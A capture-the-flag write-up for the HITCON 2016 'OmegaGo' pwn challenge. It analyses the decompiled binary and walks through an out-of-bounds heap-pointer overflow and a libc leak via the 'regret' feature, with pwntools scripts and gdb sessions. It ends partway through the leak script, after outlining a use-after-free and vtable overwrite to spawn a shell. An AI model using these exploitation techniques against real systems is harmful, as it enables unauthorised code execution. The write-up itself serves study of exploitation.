---
title: "Pwn-OmegaGo(350) - Solved by 3 Teams"
sidebar_position: 1
---


## **Information**

### **Description**
```
Want to fight with AlphaGo? Beat OmegaGo first.  
nc 52.198.232.90 31337

Note: The game rule has been simplified to make life easier.

[omega\_go](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac)  
[libc.so.6](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/libc.so.6_8674307c6c294e2f710def8c57925a50e60ee69e)
```

### **Files**
* [omega\_go\_6eef19dbb9f98b67af303f18978914d10d8f06ac](/attachments/327840/327839.bin)
* [libc.so.6\_8674307c6c294e2f710def8c57925a50e60ee69e](/attachments/327840/327838.bin)
* [omega\_go\_6eef19dbb9f98b67af303f18978914d10d8f06ac.i64](/attachments/327840/7537247.i64)

### **Source Code**

## **Write Up**

### OS information

* **This issue was tested in the following environment.**
  + The actual question is different from the server environment where the question was asked.

```sh title="OS information"
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.3 LTS
Release:	16.04
Codename:	xenial
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$
```

### File information

```sh title="File information"
autolycos@ubuntu:~/CTF/HITCON/OmegaGo$ file omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac 
omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=6101f150902c6814bd0576f35c60473105a5466e, stripped
autolycos@ubuntu:~/CTF/HITCON/OmegaGo$ checksec.sh --file omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac
autolycos@ubuntu:~/CTF/HITCON/OmegaGo$
```

### Binary analysis

* **Provides the following features.**
  + You can mark the desired area by entering row and column numbers.
    - Ex) A19
  + You can use "surrender" to give up the game and start over.
  + You can revert play using "regret".

```sh title="Play game"
autolycos@ubuntu:~/CTF/HITCON/OmegaGo$ ./omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac 
   ABCDEFGHIJKLMNOPQRS
19 ...................
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
Time remain: O: 180.00, X: 180.00

A19
   ABCDEFGHIJKLMNOPQRS
19 X..................
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ..................O
Time remain: O: 180.00, X: 173.38

regret
   ABCDEFGHIJKLMNOPQRS
19 ...................
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
Time remain: O: 180.00, X: 180.00
surrender
This AI is too strong, ah?
Play history? (y/n)
y
   ABCDEFGHIJKLMNOPQRS
19 ...................
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
piece O play at J10
Time remain: O: 180.00, X: 180.00

Play again? (y/n)
y
   ABCDEFGHIJKLMNOPQRS
19 ...................
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
Time remain: O: 180.00, X: 180.00
```

#### **Struct**

* **The following structures are required to analyze the binary.**
  + The binary is developed in C++ and uses vtables.
* **The structure below is a structure that expresses the play function of AI Class.**

```cpp title="Struct for AI Class"
struct __attribute__((aligned(8))) Method
{
  void (__fastcall **Play)(Method *a, GameInfo *state, signed int player_number, uint32_t *row, uint32_t *col);
  _QWORD empty;
};
```

* **The structure below is a structure that stores OmegaGo’s game information.**

```cpp title="Struct for OmegaGo GameInfo"
struct GameInfo
{
  _QWORD board[12];
  _DWORD rowNumber;
  _DWORD colNumber;
  _QWORD player;
  double playTimeForAI;
  double playTimeForHuman;
};
```

#### **Main()**

* **The function continues to call the MainFunction() function using the while() function.**

```cpp title="main Function"
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 result; // rax@3
  __int64 v4; // rbx@3
  __int64 v5; // [rsp+8h] [rbp-18h]@1

  v5 = *MK_FP(__FS__, 40LL);
  alarm(0xB4u);
  setvbuf(stdout, 0LL, 2, 0LL);
  while (MainFunction());
  result = 0LL;
  v4 = *MK_FP(__FS__, 40LL) ^ v5;
  return result;
}
```

#### **MainFunction(0x401738)**

* **The function has the following functions.**
  + Declare the initialization of variables needed when playing the game through the setDefGameinfo() function.
  + **Allocate the heap area (8 bytes) to AI and HUMAN variables using the “operator new(8uLL)” code.**
    - Use the setAIFunction() and setHUMANFunction() functions to store the address of the function to be called in the allocated area.
    - The addresses stored in the Play pointer function of each structure are as follows.
      * AI→Play(0x405040)→0x40290A
      * HUMAN→Play(0x405020)→0x402C12
    - The allocated heap area will not be released even if you restart the game.
  + **Execute the function to play the game through while().**
    - Calculate the player's game play time using the gettimeofday() function.
    - If the values ​​of rowNumber and colNumber are equal to -1, the game ends.
    - If the value of rowNumber and colNumber is -2, the regret() function is called, which takes one game turn.
    - If other rowNumber and colNumber values ​​are entered, the player's play time is saved.
      * If the total play time is less than 0.0, the game ends.
      * If the total play time is greater than 0.0, it is marked at the game board rowNumber and colNumber positions using the SetMarkForBoard() function.

```cpp title="MainFunction(0x401738)"
__int64 OmegaGo()
{
  Method *AI; // rbx
  Method *HUMAN; // rbx
  unsigned int rowNumber; // [rsp+Ch] [rbp-64h]
  unsigned int colNumber; // [rsp+10h] [rbp-60h]
  int playerNum; // [rsp+14h] [rbp-5Ch]
  double playTime; // [rsp+18h] [rbp-58h]
  struct timeval startTime; // [rsp+20h] [rbp-50h]
  struct timeval endTime; // [rsp+30h] [rbp-40h]
  Method *player[2]; // [rsp+40h] [rbp-30h]
  unsigned __int64 v10; // [rsp+58h] [rbp-18h]

  v10 = __readfsqword(0x28u);
  setDefGameinfo();
  playerNum = 1;
  AI = (Method *)operator new(8uLL);
  AI->Play = 0LL;
  setAIFunction(AI);
  player[0] = AI;
  HUMAN = (Method *)operator new(8uLL);
  HUMAN->Play = 0LL;
  setHUMANFunction(HUMAN);
  player[1] = HUMAN;
  while ( !((unsigned __int8)sub_401202(playerNum, &gPlayerGameInfo) ^ 1) )
  {
    gettimeofday(&startTime, 0LL);
    (*player[playerNum - 1]->Play)(player[playerNum - 1], &gPlayerGameInfo, playerNum, &rowNumber, &colNumber);
    gettimeofday(&endTime, 0LL);
    playTime = (double)(LODWORD(endTime.tv_usec) - LODWORD(startTime.tv_usec)) / 1000000.0
             + (double)(LODWORD(endTime.tv_sec) - LODWORD(startTime.tv_sec));
    if ( rowNumber == -1 || colNumber == -1 )
      break;
    if ( rowNumber != -2 && colNumber != -2 )
    {
      *(double *)&gPlayerGameInfo.board[playerNum - 1 + 14LL] = *(double *)&gPlayerGameInfo.board[playerNum - 1 + 14LL]
                                                              - playTime;
      if ( *(double *)&gPlayerGameInfo.board[playerNum - 1 + 14LL] < 0.0 )
        print("Time's up");
      SetMarkForBoard(&gPlayerGameInfo, rowNumber, colNumber, playerNum, 0);
      playerNum ^= 3u;
    }
    else if ( (unsigned __int8)regret() ^ 1 )
    {
      print("No you cant't");
    }
  }
  CheckResults();
  PlayHistory();
  return PlayAgain();
}
```

#### **UserInput(HUMAN→Play(0x405020)→0x402C12)**

* **The function has the following functions.**
  + Borad is output by the callPrintBoard() function.
  + Use the scanf() function to receive coordinate values ​​or commands from the user.
    - **The unusual parts are as follows:**
      * Save the input information to the global variable gCmd (0x60943C)
      * 10 characters are input, but 1 character and 1 numeric value are used by the sscanf() function.
  + Set the value as follows according to the input command.
    - surrender : col = -1, row = -1
    - regret : col = -2, row = -2
  + If it is not a command, the coordinate value is saved.

```cpp title="UserInput(HUMAN→Play(0x405020)→0x402C12)"
unsigned __int64 __fastcall UserInput(__int64 a1, GameInfo *gameInfo, __int64 playerNum, signed int *row, signed int *col)
{
  bool areaOverflow; // al
  char chCol; // [rsp+37h] [rbp-9h]
  unsigned __int64 v10; // [rsp+38h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  callPrintBoard(gameInfo);
  memset(gCmd, 0, 0xCuLL);
  if ( scanf("%10s", gCmd) != 1 )
    print("Er?");
  if ( !strcmp("surrender", gCmd) )
  {
    *col = -1;
    *row = *col;
  }
  else if ( !strcmp("regret", gCmd) )
  {
    *col = -2;
    *row = *col;
  }
  else
  {
    if ( sscanf(gCmd, "%c%d", &chCol, row) != 2 )
      print("Input like 'A19'");
    *col = chCol - 65;
    *row = 19 - *row;
    areaOverflow = (unsigned __int8)checkBoardArea(*row) ^ 1 || (unsigned __int8)checkBoardArea(*col) ^ 1;
    if ( areaOverflow )
      print("No overflow plz.");
  }
  return __readfsqword(0x28u) ^ v10;
}
```

#### **SetMarkForBoard**

* **The function has the following functions.**
  + The player's mark is determined using the value of the player variable.
  + Save the value in the gameinfo.Board[] area using the saveMarkofBoard() function and the coordinate values ​​(row, col) to save the mark.
  + Various functions are used to check whether the location value where the player wants to save the mark is valid.
    - CheckBoardArea(), GetMarkForBoard(), checkLocation(), ...
  + If the entered position value is not normal, a message is output and the program is terminated.
  + If the entered position value is normal, the corresponding gameInfo is saved in gHistory[].
    - Allocate the heap area using the “operator new(0x80)” code.
    - Save the address value of the allocated heap area in the gHistory[] variable.
    - In other words, the coordinate values ​​entered by the user are stored in the heap area.
* **This is where the vulnerability comes in**
  + The size of gHistory[] using the GameInfo structure is 364.
  + There is no check whether the number stored in the gHistory[] array exceeds 364.
  + If the value entered by the user exceeds 364 times, **Heap addresses** will overflow in the gPlayerGameInfo global variable.
  + In other words, **Heap addresses can be changed** based on the location value entered by the user.

```cpp title="SetMarkForBoard()"
signed __int64 __fastcall SetMarkForBoard(GameInfo *gameinfo, unsigned int inputRow, unsigned int inputCol, int player, unsigned __int8 printOpt)
{
  signed __int64 result; // rax
  signed int mark; // eax MAPDST
  bool v7; // al
  GameInfo *historyCount; // rax
  GameInfo *saveGameInfo; // ST30_8
  signed int i; // [rsp+24h] [rbp-2Ch]
  unsigned int row; // [rsp+28h] [rbp-28h]
  unsigned int col; // [rsp+2Ch] [rbp-24h]

  if ( (unsigned __int8)GetMarkForBoard((__int64)gameinfo, inputRow, inputCol) == '.' )
  {
    if ( player == 1 )
      mark = 'O';
    else
      mark = 'X';
    saveMarkofBoard((__int64)gameinfo, inputRow, inputCol, mark);
    gameinfo->rowNumber = inputRow;
    gameinfo->colNumber = inputCol;
    for ( i = 0; i <= 3; ++i )
    {
      row = dword_404FE0[i] + inputRow;
      col = dword_404FF0[i] + inputCol;
      v7 = (unsigned __int8)CheckBoardArea(row) ^ 1 || (unsigned __int8)CheckBoardArea(col) ^ 1;
      if ( !v7
        && (char)GetMarkForBoard((__int64)gameinfo, row, col) == 0xA7 - mark
        && (unsigned int)checkLocation((__int64)gameinfo, row, col) == 0 )
      {
        sub_4024C2((__int64)gameinfo, row, col);
      }
    }
    if ( (unsigned int)checkLocation((__int64)gameinfo, inputRow, inputCol) == 0 )
    {
      if ( !printOpt )
        print("Why you do this :((");
      result = 0LL;
    }
    else if ( (unsigned __int8)sub_402528((__int64)gameinfo, printOpt) )
    {
      if ( !printOpt )
        print("Wanna Ko Fight?");
      result = 0LL;
    }
    else
    {
      if ( printOpt != 1 )
      {
        LODWORD(gameinfo->player) = mark;
        historyCount = (GameInfo *)operator new(0x80uLL);
        *historyCount = *gameinfo;
        saveGameInfo = historyCount;
        LODWORD(historyCount) = gHistoryCount++;
        gHistory[(signed int)historyCount] = saveGameInfo;
      }
      result = 1LL;
    }
  }
  else
  {
    if ( !printOpt )
      print("You cheater!");
    result = 0LL;
  }
  return result;
}
```

#### **regret()**

* **The function has the following functions.**
  + If the value of the historyCnt variable is 0, the function ends.
  + If the value of the historyCnt variable is not 0, the following code is executed.
    - Use the DeletePlayHistory() function to delete the last played GameInfo in gHistory[].
      * Delete AI and Human play records.
    - AI extracts the last played GameInfo and stores it in gPlayerGameInfo.
  + **There is code that can be exploited here as well.**
    - Heap addresses overflow in the gPlayerGameInfo global variable (gHistory[365]) due to the vulnerability described previously.
    - Change the heap addresses stored in the gPlayerGameInfo global variable (gHistory[365]) using user input values.
      * gHistory[365]: Changed Heap addresses
      * gHistory[366] : Heap addresss
      * gHistory[367] : Heap addresss
    - When the regret() function is called, "history = (GameInfo \*)::gHistory[historyCnt - 1];" GameInfo is output based on the “changed heap addresses” by the code.
    - In other words, Libc addresses can be output using the vulnerability.

```cpp title="regret()"
signed __int64 __cdecl regret()
{
  GameInfo *history; // rax

  if ( historyCnt <= 1 )
    return 0LL;
  DeletePlayHistory();                          // AI play history
  DeletePlayHistory();                          // Human play history
  if ( ::gHistory[historyCnt - 1] )
  {
    history = (GameInfo *)::gHistory[historyCnt - 1];
    gPlayerGameInfo.board[0] = history->board[0];
    gPlayerGameInfo.board[1] = history->board[1];
    gPlayerGameInfo.board[2] = history->board[2];
    gPlayerGameInfo.board[3] = history->board[3];
    gPlayerGameInfo.board[4] = history->board[4];
    gPlayerGameInfo.board[5] = history->board[5];
    gPlayerGameInfo.board[6] = history->board[6];
    gPlayerGameInfo.board[7] = history->board[7];
    gPlayerGameInfo.board[8] = history->board[8];
    gPlayerGameInfo.board[9] = history->board[9];
    gPlayerGameInfo.board[10] = history->board[10];
    gPlayerGameInfo.board[11] = history->board[11];
    *(_QWORD *)&gPlayerGameInfo.rowNumber = *(_QWORD *)&history->rowNumber;
    gPlayerGameInfo.player = history->player;
    gPlayerGameInfo.playTimeFor[0] = history->playTimeFor[0];
    gPlayerGameInfo.playTimeFor[1] = history->playTimeFor[1];
  }
  return 1LL;
}
```

#### **DeletePlayHistory**

* **The function has the following functions.**
  + Releases the heap area stored in gHistory[].

```cpp title="DeletePlayHistory()"
unsigned __int64 DeletePlayHistory()
{
  __int64 v1; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( gHistory[historyCnt - 1] )
  {
    v1 = sub_401EB6((GameInfo *)gHistory[historyCnt - 1]);
    operator delete(gHistory[historyCnt - 1]);
    sub_402FE6(&unk_607220, &v1);
    --historyCnt;
  }
  return __readfsqword(0x28u) ^ v2;
}
```

### **Debuging**

#### **Overflow**

* **You can overflow the value of the gameInfo global variable using the following code.**

```python title="Overflow for gameInfo"
from pwn import *

#context.log_level = 'debug'

col_list = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S']

p = process('omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac')

def Play(location):
	p.recvuntil('\n\n')
	p.sendline(location)

def Fill(colStart, colEnd, row):
	for colNum in range(col_list.index(colStart),col_list.index(colEnd)+1):
		locate = str(col_list[colNum])
		locate += str(row)
		Play(locate)

Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)
Fill('A','K',12)

p.interactive()
```

* **Before debugging, you need to know the location of each global variable.**
  + gGameInfo : 0x609FC0
  + gHistory : 0x609460
  + gPlayerGameInfo Addresss(0x609FC0) - gHistory(0x609460) = 0xb60(2912) / 0x8(addresss len) = 364
* **The following is what was confirmed through debugging.**
  + You can see that the heap addresses (0x609fc0) value is saved in the gPlayerGameInfo (0x609fc0) global variable.

```sh title="overflow for gameInfo"
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$ gdb -q -p 3491
Attaching to process 3491

gdb-peda$ x/gx 0x609FC0
0x609fc0:	0x0000000000b94da0
gdb-peda$ x/10gx 0x609FC0
0x609fc0:	0x0000000000b94da0	0x0000000000000000
0x609fd0:	0x0000000000000000	0x0000000000000000
0x609fe0:	0xaaaa0000aaaaa800	0x50000100002aaaaa
0x609ff0:	0x5554000155555555	0x0000000000000055
0x60a000:	0x0000000000000000	0x0000000000000000
```

* **You can check that the contents of the Board output through the corresponding Overflow have changed.**
  + We can use that information to extract heap addresses.

```sh title="overflow for gameInfo"
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$ python test.py 
[!] Cold not find executable 'omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac' in $PATH, using './omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac' instead
[+] Starting local process './omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac': pid 3491
[*] Switching to interactive mode
   ABCDEFGHIJKLMNOPQRS
19 ..XXO\x00.OOX\x00X.......
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 XXXXXXXXXXX........
11 XXXXXXXXXXXXXXXXXXX
10 .........O.........
 9 OOOOOOOOOOOOOOOOOOO
 8 ........OOOOOOOOOOO
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 ...................
Time remain: O: 180.00, X: 179.84

$
```

#### **Decode**
* **In order to interpret the addresses displayed on the screen, it is necessary to check how the mark value stored on the board is managed.**
* **When the user inputs coordinate values ​​as follows, the memory value changes as follows.**
  + The value entered by the user is stored as 0x2 in the 0x609fc0 area.
  + The value entered by the computer is stored as 0x1 in the 0x60a01A area.

```sh title="Coordinates input" 
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$ gdb -q ./omega*
Reading symbols from ./omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/OmegaGo/omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac 

...Print board...
Time remain: O: 180.00, X: 180.00

A19

...Print board...
Time remain: O: 180.00, X: 171.04

^C
Program received signal SIGINT, Interrupt.

gdb-peda$ x/12gx 0x609FC0
0x609fc0:	0x0000000000000002	0x0000000000000000
0x609fd0:	0x0000000000000000	0x0000000000000000
0x609fe0:	0x0000000000000000	0x0000010000000000
0x609ff0:	0x0000000000000000	0x0000000000000000
0x60a000:	0x0000000000000000	0x0000000000000000
0x60a010:	0x0000000000000000	0x0000000000010000
gdb-peda$
```

* **Check for additional memory changes as follows.**
  + When all 19 rows are filled in through user input, they are stored in memory as follows:
    - The value entered by the user is 0x2aaaaaaaaa.
    - The value entered by the computer is 0x01555555555.

```sh title="Fill in line 19"
   ABCDEFGHIJKLMNOPQRS
19 XXXXXXXXXXXXXXXXXXX
18 ...................
17 ...................
16 ...................
15 ...................
14 ...................
13 ...................
12 ...................
11 ...................
10 .........O.........
 9 ...................
 8 ...................
 7 ...................
 6 ...................
 5 ...................
 4 ...................
 3 ...................
 2 ...................
 1 OOOOOOOOOOOOOOOOOOO
Time remain: O: 180.00, X: 141.02

^C
Program received signal SIGINT, Interrupt.
0x00007ffff75e66b0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:81
81	../sysdeps/unix/syscall-template.S: No such file or directory.
gdb-peda$  x/12gx 0x609FC0
0x609fc0:	0x0000002aaaaaaaaa	0x0000000000000000
0x609fd0:	0x0000000000000000	0x0000000000000000
0x609fe0:	0x0000000000000000	0x0000010000000000
0x609ff0:	0x0000000000000000	0x0000000000000000
0x60a000:	0x0000000000000000	0x0000000000000000
0x60a010:	0x5555500000000000	0x0000000000015555
gdb-peda$
```

* **Values ​​stored on the Board are managed in the following ways.**
  + The value to be stored in the Board area is determined using bits.
  + Players are identified using the following bit values.
    - AI : 10 bit
    - Humman : 01bit

:::note[Mark]
| Mark /  Player | X / O | | X. / O. | | XX / OO | |
| --- | --- | --- | --- | --- | --- | --- |
| bit | hex | bit | hex | bit | hex |
| AI | 10 | 0x2 | 1000 | 0x8 | 1010 | 0xA |
| Humman | 01 | 0x1 | 0100 | 0x4 | 0101 | 0x5 |
:::

* **Using this information, we can write decryption tools such as:**

```python title="Decode"
def decode(offset):
    bit_offset = offset * 8
    data = ''.join(board)
    result = 0
    for i in xrange(32):
        states = '.OX\0'
        val = states.index(data[bit_offset + i])
        result |= val << (i * 2)
    return result
```

### Structure of Exploit code

* The order of payload is as follows:

:::note[Payload order]
1. Leak Libc Addresss
2. Overwrite the Computer Class
3. Overwrite the vtable
:::

* This is explained in more detail as follows.

:::note[Detailed description]
1. LeakLibcAddresss
   1. Overwrites gameInfo data
   2. Heap addresss change
   3. Deletes the allocated heap memory.
2. Overwrite the Computer Class
   1. Memory reallocation
   2. Create a UAF vulnerability(Fake chunk)
   3. Heap addresss change
   4. Deletes the allocated heap memory.
3. Overwrite the vtable
   1. execve("/bin/sh")
:::

* The information you need to find out for an attack based on the payload is as follows.

:::note[Information List]
* Leak libc addresss
* Fake chunk
* execve("/bin/sh")
:::

* Obtain the shell with the following structure.

:::note[Shell Code]
|  | vtable | void (\_\_fastcall \*Play) | void (\_\_fastcall \*Play) |
| --- | --- | --- | --- |
| AI | Heap addresss | 0x405040 | 0x40290A |
| AI | Heap addresss(UAF) | gCmd(0x60943C) global variable | User input(Call One gadget) |
:::

### **Information for attack**

#### **Leak Libc addresss**

* **You can save the address of the “main\_arena.top” area in the Heap area using the “regret” function as follows.**
  + When the user enters a location value, GameInfo (0x80) is created and stored in gHistory[].
    - AI GameInfo : 0x61d220
    - HUMAN GameInfo : 0x61d160
  + A heap area with a size of 0x20 is allocated between AI and HUMAN GameInfo.  
    - Heap addresss : 0x61d1f0

```sh title="gHistory[] info"
lazenca0x0@ubuntu:~/CTF/HITCON/OmegaGo$ gdb -q ./omega*
Reading symbols from ./omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/OmegaGo/omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac 
   ABCDEFGHIJKLMNOPQRS

...Print board...

Time remain: O: 180.00, X: 180.00
A19
   ABCDEFGHIJKLMNOPQRS

...Print board...

Time remain: O: 180.00, X: 176.49

^C
Program received signal SIGINT, Interrupt.
gdb-peda$ x/4gx 0x609460
0x609460:	0x000000000061cc90	0x000000000061d160
0x609470:	0x000000000061d220	0x0000000000000000
gdb-peda$ x/4gx 0x000000000061d160 - 0x10
0x61d150:	0xb3c74b70123a5ec4	0x0000000000000091
0x61d160:	0x0000000000000002	0x0000000000000000
gdb-peda$ x/4gx 0x000000000061d220 - 0x10
0x61d210:	0x91f146e6557b6e4a	0x0000000000000091
0x61d220:	0x0000000000000002	0x0000000000000000
gdb-peda$ x/4gx 0x61d1e0
0x61d1e0:	0xf90d94745f8a1984	0x0000000000000031
0x61d1f0:	0xeeda74e900000001	0x0000000000607228
gdb-peda$
```

* **When the “regret” function is called, the two GameInfos stored at the end of gHistory[] are deleted.**
  + For analysis, set a break point in the "0x4015CE" area.
  + When the AI ​​GameInfo (0x61d220) area is released, that area becomes the Top chunk.
    - Area 0x61d210 is stored in the top area of ​​main\_arena.
  + When the HUMAN GameInfo (0x61d160) area is released, the area becomes an Unsorted chunk.  
    - The 0x61d150 area is saved in the main\_arena.bin[0], [1] area.
    - The address value of main\_arena.top is stored in the fd and bk areas of the unsorted chunk (0x61d150).

```sh title="Create libc address"
gdb-peda$ b *0x4015CE
Breakpoint 1 at 0x4015ce
gdb-peda$ c
Continuing.
regret
Breakpoint 1, 0x00000000004015ce in ?? ()
gdb-peda$ i r rdi
rdi            0x61d220	0x61d220
gdb-peda$ p main_arena.top
$1 = (mchunkptr) 0x61d210
gdb-peda$ c
Continuing.

Breakpoint 1, 0x00000000004015ce in ?? ()
gdb-peda$ i r rdi
rdi            0x61d160	0x61d160
gdb-peda$ ni
gdb-peda$ p main_arena.bins[0]
$2 = (mchunkptr) 0x61d150
gdb-peda$ p main_arena.bins[1]
$3 = (mchunkptr) 0x61d150
gdb-peda$ 
gdb-peda$ x/4gx 0x61d150
0x61d150:	0xb3c74b70123a5ec4	0x0000000000000091
0x61d160:	0x00007ffff7839b78	0x00007ffff7839b78
gdb-peda$
```

* ****There is an important part before changing the values ​​(Heap addresses) stored in gPlayerGameInfo.****
  + Those are the values ​​(Heap addresses) stored in gPlayerGameInfo.
    - The program uses 2 bits to distinguish between HUMAN and AI signs.
  + The next important thing is that both bits cannot be 1 due to user input.
  + In other words, there are restrictions on changing the values ​​stored in gPlayerGameInfo with user input values.
* **The following is when the value 0x61cc90 is stored in the gPlayerGameInfo global variable.**
  + If you change the address to bit, it becomes "0110 0001 1100 1100 1001 0000".
  + Here's where the user can enter values:
    - Only the part where the bit value is “00” can be stored.
    - "0110 0001 1100 1100 1001 0000"
  + This can be resolved by calling the surrender() function to change the address value stored in the gPlayerGameInfo global variable.  
    - Calling the surrender() function resets the game.
    - Since the reset does not release the vtable area of ​​the previously used AI and HUMAN Class, the Heap address stored in the gPlayerGameInfo global variable is changed.
* **You can change the values ​​(Heap addresses) stored in gPlayerGameInfo in the following way.**
  + Save 365 GameInfo items in the gHistory[] area using a script.
    - Due to this, the Heap area is stored in the board[0] area of ​​gPlayerGameInfo.
      * gPlayerGameInfo(0x609fc0) : 0x1c88e30
    - The Heap address value stored in the gPlayerGameInfo area can be changed with user input.
  + Enter "D19" as the user input value.
    - Due to this value, the Heap address stored in gPlayerGameInfo changed from "0x1c88e30" to "0x1c88eb0".
      * "0x1c88e30" + "0x80" = 0x1c88eb0

```sh title="Change the Heap address."
lazenca0x0@ubuntu:~$ gdb -p 4425
gdb-peda$ x/4gx 0x609FC0
0x609fc0:	0x0000000001c88e30	0x0000000000000000
0x609fd0:	0x0000000000000000	0x0000000000000000
gdb-peda$ b *0x4015CE
Breakpoint 1 at 0x4015ce
gdb-peda$ c
Continuing.

Input "D19"

gdb-peda$ x/4gx 0x609FC0
0x609fc0:	0x0000000001c88eb0	0x0000000001c88ef0
0x609fd0:	0x0000000001c88fb0	0x0000000000000000

gdb-peda$ p/x 0x1c88e30 + 0x80
$1 = 0x1c88eb0
gdb-peda$
```

* **You can output the address value of main\_arena.top stored in the fd and bk areas of the unsorted chunk in the following way.**
  + Calling the "regret" function frees the last two Heap areas stored in the gHistory[] array.
    - As explained previously, the HUMAN GameInfo (0x1c88ef0) area is Unsorted chunk.
    - The address value of main\_arena.top is stored in the fd and bk areas of the unsorted chunk (0x1c88ee0).  
      * fd(0x1c88ef0) : 0x7f4b7d233b78
      * bk(0x1c88ef8) : 0x7f4b7d233b78
  + The regret() function stores GameInfo in the gPlayerGameInfo global variable using the address (0x1c88eb0) stored in gHistory[365].  
    - In other words, the fd and bk areas of the unsorted chunk (0x1c88ee0) are output.
    - The value can be interpreted using the Decode() function written earlier.

```sh title="Get libc address."
gdb-peda$ c
Continuing.
Breakpoint 1, 0x00000000004015ce in ?? ()
gdb-peda$ c
Continuing.

Breakpoint 1, 0x00000000004015ce in ?? ()
gdb-peda$ ni
gdb-peda$ x/4gx 0x1c88ef0 - 0x10
0x1c88ee0:	0x33bb5de964b6f848	0x0000000000000091
0x1c88ef0:	0x00007f4b7d233b78	0x00007f4b7d233b78
gdb-peda$ p/x 0x1c88ef0 - 0x1c88eb0
$2 = 0x40
gdb-peda$ c
Continuing.
^C
Program received signal SIGINT, Interrupt.
0x00007f4b7cf66230 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
gdb-peda$ x/12gx 0x609FC0
0x609fc0:	0x0000000000000000	0x0000000000000031
0x609fd0:	0x0000000001c88f70	0x0000000001c83880
0x609fe0:	0x0000000000000000	0x0000000000000000
0x609ff0:	0x33bb5de964b6f848	0x0000000000000091
0x60a000:	0x00007f4b7d233b78	0x00007f4b7d233b78
0x60a010:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* **You can use the following code:**

```python title="Get libc address"
from pwn import *
 
#context.log_level = 'debug'
 
col_list = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S']
 
p = process('omega_go_6eef19dbb9f98b67af303f18978914d10d8f06ac')

def Play(location):
    p.recvuntil('\n\n')
    p.sendline(location)
 
 
def readBoard():
    global board
    board = []
    p.recvline()
    for line in range(0,19):
    	p.recv(3)
        board.append(p.recvuntil('\n')[0:19])
 
def surrender():
    p.recvuntil('\n\n')
    p.sendline('surrender')
    p.recvuntil('Play history? (y/n)')
    p.sendline('n')
    p.recvuntil('Play again? (y/n)')
    p.sendline('y')
 
def Fill(colStart, colEnd, row):
    for colNum in range(col_list.index(colStart),col_list.index(colEnd)+1):
    	locate = str(col_list[colNum])
        locate += str(row)
        Play(locate)
 
def decode(offset):
    bit_offset = offset * 8
    data = ''.join(board)
    result = 0
    for i in xrange(32):
        states = '.OX\0'
        val = states.index(data[bit_offset + i])
        result |= val << (i * 2)
    return result
 
def LeakAddresss():
    readBoard()
    return decode(0)
 
def LeakLibcAddresss():
    readBoard()
    return decode(32)
  
#Memory reconstruction   
surrender()
 
#Fill out to board
Fill('B','S',11)
for count in reversed(range(1,9)):
    Fill('A','S',count)
Fill('A','A',11)
Fill('A','K',12)

#Leak LibcAddresss
p.recvuntil('\n\n')
p.sendline('D19')
p.recvuntil('\n\n')
p.sendline('regret')

libcAddresss = LeakLibcAddresss()
